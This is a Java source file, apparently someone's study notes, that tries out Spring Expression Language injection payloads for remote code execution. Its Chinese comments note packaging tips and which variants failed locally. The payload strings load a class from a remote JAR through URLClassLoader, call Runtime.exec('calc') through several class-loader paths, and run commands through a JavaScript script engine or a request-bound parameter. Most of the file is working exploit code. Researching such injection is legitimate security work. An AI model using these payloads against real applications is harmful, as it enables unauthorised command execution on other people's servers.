package com.test;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class RcePart2 {
    public static void main(String[] args) {
//        urlLoader();
//        appLoader();
        getAppFromOtherClass();
    }

    /*打包jar时，如果类在多层包中，打包时一定要把前面几层文件夹也打包进行，jar打开应该是aaa/bbb/Exp.class的形式，这样才能正常loadClass*/
    public static void urlLoader(){
        String cmdStr = "new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(\"http://127.0.0.1:7777/Exp.jar\")}).loadClass(\"aaa.bbb.Exp\").getConstructors()[0].newInstance(\"calc\")";

        ExpressionParser parser = new SpelExpressionParser();//创建解析器
        Expression exp = parser.parseExpression(cmdStr);//解析表达式
        System.out.println( exp.getValue() );
    }

    public static void appLoader(){
        String cmdStr = "T(ClassLoader).getSystemClassLoader().loadClass(\"java.lang.Runtime\").getRuntime().exec('calc')";

        ExpressionParser parser = new SpelExpressionParser();
        Expression exp = parser.parseExpression(cmdStr);
        System.out.println( exp.getValue() );
    }

    /*我这里利用失败了*/
    public static void getAppFromOtherClass(){
        String cmdStr = "T(org.springframework.expression.Expression).getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"calc\")";

        ExpressionParser parser = new SpelExpressionParser();
        Expression exp = parser.parseExpression(cmdStr);
        System.out.println( exp.getValue() );
    }

    /*有web上下文的环境使用。不过我本地测试全失败了。而且不知道为什么文章里要加[[${}]]*/
    public static void getUrlFromInnerClass(){
        String cmdStr1 = "#request.getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"calc\")";
        String cmdStr2 = "username[#this.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"java.lang.Runtime.getRuntime().exec('xterm')\")]=asdf";
    }
}
